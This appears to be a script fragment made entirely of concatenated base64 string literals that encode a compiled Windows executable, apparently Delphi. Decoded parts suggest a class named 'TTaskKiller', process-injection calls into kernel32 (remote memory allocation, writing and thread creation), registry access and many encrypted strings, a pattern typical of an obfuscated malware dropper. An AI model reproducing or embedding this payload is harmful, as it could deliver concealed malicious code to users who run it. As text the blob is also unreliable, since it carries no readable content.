'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' + 
'FcB6QwCLMP9WDIuFdP///42VeP///+i1IP7/i4V4////UI2VbP///7iI4kIA6F4m/v+LlWz///+NhXD////oBXL9/42FcP///1CNlWT///+hxHpDAOj6rf3/i5Vk////jYVo////6N1x/f+LlWj///9Y6P1x/f+LlXD///+4AQAAgFnoFBD+//8FwHpDAEsPhVb///+LHcR6QwCF2w+MiQAAAEPHBcR6QwAAAAAAjZVc////uMziQgDo0iX+/42F' + 
'XP///1CNlVj///+hxHpDAOh/rf3/i5VY////WOhXa/3/i5Vc////jYVg////6FZx/f+LhWD///9QjZVU////M8DoYhz+/4uFVP///2a5AQBa6FoU/v+LFcR6QwCJBJXUekMA/wXEekMAS3WCoVAmQwCAOAB0Bei12///ix3EekMAhdt8KEPHBcR6QwAAAAAAav+hxHpDAIsEhdR6QwBQ6ACO/f//BcR6QwBLdeONlVD///8zwOjKEf7/i4VQ////' + 
'sQGyAejj0v//oaB6QwDopcT+/42VTP///zPA6KQR/v+LlUz///8zyaG0ekMA6LbO///o+fT//zPAWllZZIkQaNfgQgCNhUz///+6AwAAAOgIb/3/jYVY////ugIAAADo0Gf9/42FYP///+jVbv3/jYVk////6JZn/f+NhWj////ov279/42FbP///+iAZ/3/jYVw////ugYAAADovG79/41FiOhoZ/3/jUWM6JRu/f+NRZDoWGf9/41FnOiEbv3/' + 
'jUWg6Ehn/f+NRai6CAAAAOhfZ/3/jUXIugQAAADoem79/41F2OgmZ/3/jUXc6FJu/f+NReC6AgAAAOg1Z/3/jUXougYAAADoUG79/8PpKl/9/+kt////X15bi+VdwwAA/////yYAAAC10hO+Vha3AeMzqXnw3THO+senCfUvMok2PFHFhzLutZYf0vxTBwAA/////zgAAABJ3s3j6KRbCQLv9RroTMMDMVWzKT6tdLnvOkQXMnpJZZJm1wFZ70vP' + 
'ebRG7Tyinfh3dyUMVRcotQAAAAD/////IgAAAJu0lowNMwmCxqOXdCqoB8hXkKHLpS1fb4EiuH/x0tCJac0AAP////8nAAAAeh/onMvCbr6l1ZKIg8bHFzHVhbC74SHrSjN9mlwg8PR5fr/AaxbWAP////8qAAAAt7K5fd4ybzEOO4zErV0Ne8iE57YnPSd+k7majcMtd9xD1otGsB1+LkelAAD/////KgAAACJ9t1byiOWKDyZTCGM5eE/2IgcR' + 
'RznTRzLU1UThN52NvtYQq9JyRw0UIgAA/////zIAAABhzdDcRO6uLuRVwgiAPMa1TWcJL8jYG+TzGhf87+cFs0CAtcmpPs3WwsXFGoDilhImpAAA/////yIAAAADTYCdf02ShIv5MYQxK/cax720xVS8q9D3pCI209Vh02yWAAD/////OAAAAGnwBCzyNtqr3ss5fUASvDxdWPH7XM3cxdeL0C+DbSHTmabBJghADBr6czFW/Sox/RWsktlOY8uo' + 
